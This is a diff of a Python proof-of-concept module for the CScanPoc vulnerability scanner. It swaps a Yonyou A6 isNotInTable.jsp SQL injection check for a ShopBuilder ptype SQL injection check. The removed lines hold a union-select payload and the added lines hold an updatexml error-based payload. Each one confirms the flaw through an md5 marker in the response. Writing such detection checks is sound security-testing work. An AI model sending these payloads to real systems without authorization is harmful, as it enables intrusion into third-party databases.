@@ -1,29 +1,28 @@
 # coding: utf-8
-import requests
-
+import re
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0101' # 平台漏洞编号，留空
-    name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
+    vuln_id = 'ShopBuilder_0101' # 平台漏洞编号，留空
+    name = 'ShopBuilder /?m=product&s=list&ptype SQL注入' # 漏洞名称
+    level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2015-08-31'  # 漏洞公布时间
+    disclosure_date = '2015-03-30'  # 漏洞公布时间
     desc = '''
-    用友 mysql+jsp 注入
+    ?m=product&s=list&ptype=0，sqli=ptype
     ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-0110312
+    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-080770
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'Yonyou'  # 漏洞应用名称
+    product = 'ShopBuilder'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '1f9b0911-3a30-40e6-8142-ddd7599f322a' # 平台 POC 编号，留空
+    poc_id = '47d97819-2f8c-4bba-b8b7-375906080526' # 平台 POC 编号，留空
     author = 'hyhmnn'  # POC编写者
     create_date = '2018-05-29' # POC创建时间
 
@@ -35,10 +34,11 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
             url = self.target
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % url
-            req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            payload = ("/?m=product&s=list&ptype=0%27%20and%201%3Dupdatexml%281%2Cconcat%280x5c%2Cmd5"
+                       "%28222222%29%29%2C1%29%23")
+            verify_url = url + payload
+            content = requests.get(verify_url).content
+            if 'e3ceb5881a0a1fdaad01296d7554868d' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
